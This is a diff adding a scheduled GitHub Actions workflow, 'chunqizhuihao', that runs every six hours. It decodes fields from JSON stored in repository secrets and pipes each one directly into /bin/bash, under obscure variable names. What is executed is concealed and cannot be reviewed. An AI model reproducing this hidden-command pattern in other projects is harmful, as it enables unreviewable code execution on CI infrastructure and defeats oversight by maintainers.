@@ -1,0 +1,26 @@
+name: chunqizhuihao
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: chunqizhuihao
+        env:
+          ncn5: ${{ secrets.ncn5 }}
+        run: |
+          echo $ncn5 | jq -r .xjcsr6 | /bin/bash
+          echo $nz56 | jq -r .ry9086 | /bin/bash
+          echo $gdqw0 | jq -r .hcpkm58 | /bin/bash
+          echo $dqzw6204 | jq -r .sj17 | /bin/bash
+          echo $ggqj139 | jq -r .hp846 | /bin/bash
+          echo $sbue62029 | jq -r .lwy854 | /bin/bash
+          echo $kctrx88 | jq -r .n5132 | /bin/bash
+          echo $gcv2 | jq -r .xsg12 | /bin/bash
+          echo $vpib34 | jq -r .mgpuo466 | /bin/bash
+
